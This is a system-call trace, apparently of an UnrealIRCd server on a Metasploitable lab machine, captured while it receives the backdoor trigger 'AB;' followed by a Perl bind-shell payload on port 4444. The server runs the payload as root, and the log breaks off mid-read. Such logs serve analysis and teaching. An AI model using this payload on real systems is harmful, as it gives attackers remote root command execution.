4519  07:45:19.470644 select(1024, [2 3 4 7 9], [], NULL, {0, 460000}) = 1 (in [9], left {0, 310000})
4519  07:45:19.618195 clock_gettime(CLOCK_MONOTONIC, {3129, 435204303}) = 0
4519  07:45:19.618205 recv(9, "PRIVMSG  #testit3 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:45:19.618242 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618261 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618276 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618291 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618304 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618319 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618332 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618346 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618359 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618373 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618386 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618400 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618413 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618427 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618440 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618454 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618467 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618481 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618494 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618509 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618524 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618641 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:19.618675 gettimeofday({1495626319, 618679}, NULL) = 0
4519  07:45:19.618687 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 950000})
4519  07:45:19.669912 clock_gettime(CLOCK_MONOTONIC, {3129, 486932570}) = 0
4519  07:45:19.669932 time(NULL)        = 1495626319
4519  07:45:19.669947 time(NULL)        = 1495626319
4519  07:45:19.669963 gettimeofday({1495626319, 669967}, NULL) = 0
4519  07:45:19.669975 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  07:45:19.670015 clock_gettime(CLOCK_MONOTONIC, {3129, 487027597}) = 0
4519  07:45:19.670025 gettimeofday({1495626319, 670029}, NULL) = 0
4519  07:45:19.670036 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:45:19.670074 clock_gettime(CLOCK_MONOTONIC, {3129, 487087241}) = 0
4519  07:45:19.670086 accept(2, 0, NULL) = 5
4519  07:45:19.670105 getpeername(5, {sa_family=AF_INET, sin_port=htons(37627), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:45:19.670137 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:45:19.670150 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:45:19.670163 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:45:19.670177 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:45:19.670189 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:45:19.670200 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:45:19.670263 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:45:19.670281 clock_gettime(CLOCK_MONOTONIC, {3129, 487294871}) = 0
4519  07:45:19.670293 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:45:19.670306 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:45:19.670379 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:45:19.670390 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:45:19.670418 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:45:19.670435 send(6, "\333P\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:45:19.670484 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:45:19.670526 gettimeofday({1495626319, 670530}, NULL) = 0
4519  07:45:19.670554 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:45:19.676193 clock_gettime(CLOCK_MONOTONIC, {3129, 493209649}) = 0
4519  07:45:19.676209 recvfrom(6, "\333P\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\232\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:45:19.676248 close(6)          = 0
4519  07:45:19.676262 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:45:19.676276 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:45:19.676332 time(NULL)        = 1495626319
4519  07:45:19.676344 time(NULL)        = 1495626319
4519  07:45:19.676355 gettimeofday({1495626319, 676359}, NULL) = 0
4519  07:45:19.676366 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:45:19.676395 clock_gettime(CLOCK_MONOTONIC, {3129, 493407708}) = 0
4519  07:45:19.676415 gettimeofday({1495626319, 676420}, NULL) = 0
4519  07:45:19.676454 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 650000})
4519  07:45:20.018388 clock_gettime(CLOCK_MONOTONIC, {3129, 835397210}) = 0
4519  07:45:20.018388 recv(9, "PRIVMSG  #testit3 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:45:20.018389 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018389 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018389 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018389 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018389 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018391 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018405 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018419 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018433 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018446 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018460 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018473 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018487 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018501 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018514 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018527 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018541 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018554 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018568 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018582 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018602 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018629 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 620000}, ...}) = 0
4519  07:45:20.018647 gettimeofday({1495626320, 18650}, NULL) = 0
4519  07:45:20.018659 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:45:20.018700 clock_gettime(CLOCK_MONOTONIC, {3129, 835713338}) = 0
4519  07:45:20.018712 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:45:20.018741 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:45:20.018761 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:45:20.018773 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:45:20.018788 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 13031
13031 07:45:20.018857 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
13031 07:45:20.018871 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
13031 07:45:20.018882 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
13031 07:45:20.018896 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
13031 07:45:20.019002 brk(0)            = 0x80f9000
13031 07:45:20.019025 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13031 07:45:20.019043 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f0e000
13031 07:45:20.019059 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
13031 07:45:20.019076 open("/etc/ld.so.cache", O_RDONLY) = 1
13031 07:45:20.019089 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
13031 07:45:20.019108 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f06000
13031 07:45:20.019149 close(1)          = 0
13031 07:45:20.019175 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13031 07:45:20.019190 open("/lib/libncurses.so.5", O_RDONLY) = 1
13031 07:45:20.019204 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
13031 07:45:20.019299 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
13031 07:45:20.019317 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ed6000
13031 07:45:20.019329 mmap2(0xb7f03000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f03000
13031 07:45:20.019346 close(1)          = 0
13031 07:45:20.019358 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13031 07:45:20.019372 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
13031 07:45:20.019389 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
13031 07:45:20.019484 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
13031 07:45:20.019501 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ed2000
13031 07:45:20.019512 mmap2(0xb7ed4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ed4000
13031 07:45:20.019529 close(1)          = 0
13031 07:45:20.019540 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13031 07:45:20.019553 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
13031 07:45:20.019567 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
13031 07:45:20.019669 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
13031 07:45:20.019686 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ed1000
13031 07:45:20.019701 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d82000
13031 07:45:20.019712 mmap2(0xb7ecb000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ecb000
13031 07:45:20.019727 mmap2(0xb7ece000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ece000
13031 07:45:20.019741 close(1)          = 0
13031 07:45:20.019763 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d81000
13031 07:45:20.019775 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d816b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
13031 07:45:20.019831 mprotect(0xb7ecb000, 4096, PROT_READ) = 0
13031 07:45:20.019869 munmap(0xb7f06000, 29913) = 0
13031 07:45:20.019895 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
13031 07:45:20.019909 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
13031 07:45:20.019928 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfba8d60) = -1 ENOTTY (Inappropriate ioctl for device)
13031 07:45:20.019962 brk(0)            = 0x80f9000
13031 07:45:20.019972 brk(0x80fa000)    = 0x80fa000
13031 07:45:20.019984 brk(0x80fb000)    = 0x80fb000
13031 07:45:20.020000 getuid32()        = 0
13031 07:45:20.020010 getgid32()        = 0
13031 07:45:20.020019 geteuid32()       = 0
13031 07:45:20.020028 getegid32()       = 0
13031 07:45:20.020041 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
13031 07:45:20.020055 time(NULL)        = 1495626320
13031 07:45:20.020068 brk(0x80fc000)    = 0x80fc000
13031 07:45:20.020083 brk(0x80fd000)    = 0x80fd000
13031 07:45:20.020102 open("/proc/meminfo", O_RDONLY) = 1
13031 07:45:20.020133 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
13031 07:45:20.020152 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f0d000
13031 07:45:20.020163 read(1, "MemTotal:      1035240 kB\nMemFree:        290400 kB\nBuffers:         91548 kB\nCached:         491472 kB\nSwapCached:          0 kB\nActive:         258424 kB\nInactive:       453532 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        290160 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4656 kB\nWriteback:           0 kB\nAnonPages:      128988 kB\nMapped:          52004 kB\nSlab:            21560 kB\nSReclaimable:    12636 kB\nSUnreclaim:       8924 kB\nPageTables:       1972 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
13031 07:45:20.020247 close(1)          = 0
13031 07:45:20.020258 munmap(0xb7f0d000, 4096) = 0
13031 07:45:20.020270 brk(0x80fe000)    = 0x80fe000
13031 07:45:20.020297 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
13031 07:45:20.020310 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
13031 07:45:20.020322 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
13031 07:45:20.020334 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
13031 07:45:20.020346 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
13031 07:45:20.020358 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
13031 07:45:20.020371 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
13031 07:45:20.020382 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
13031 07:45:20.020395 uname({sys="Linux", node="metasploitable", ...}) = 0
13031 07:45:20.020443 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
13031 07:45:20.020462 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
13031 07:45:20.020480 brk(0x8100000)    = 0x8100000
13031 07:45:20.020492 getcwd("/etc/unreal", 4096) = 12
13031 07:45:20.020506 getpid()          = 13031
13031 07:45:20.020522 getppid()         = 4519
13031 07:45:20.020538 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
13031 07:45:20.020558 stat64("/sbin/sh", 0xbfba8d38) = -1 ENOENT (No such file or directory)
13031 07:45:20.020570 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
13031 07:45:20.020588 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
13031 07:45:20.020621 socket(PF_FILE, SOCK_STREAM, 0) = 1
13031 07:45:20.020635 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
13031 07:45:20.020647 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
13031 07:45:20.020669 close(1)          = 0
13031 07:45:20.020681 socket(PF_FILE, SOCK_STREAM, 0) = 1
13031 07:45:20.020691 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
13031 07:45:20.020701 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
13031 07:45:20.020720 close(1)          = 0
13031 07:45:20.020733 open("/etc/nsswitch.conf", O_RDONLY) = 1
13031 07:45:20.020747 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
13031 07:45:20.020764 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f0d000
13031 07:45:20.020779 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
13031 07:45:20.020828 read(1, "", 4096) = 0
13031 07:45:20.020838 close(1)          = 0
13031 07:45:20.020847 munmap(0xb7f0d000, 4096) = 0
13031 07:45:20.020863 open("/etc/ld.so.cache", O_RDONLY) = 1
13031 07:45:20.020876 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
13031 07:45:20.020892 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f06000
13031 07:45:20.020902 close(1)          = 0
13031 07:45:20.020913 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13031 07:45:20.020928 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
13031 07:45:20.020942 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 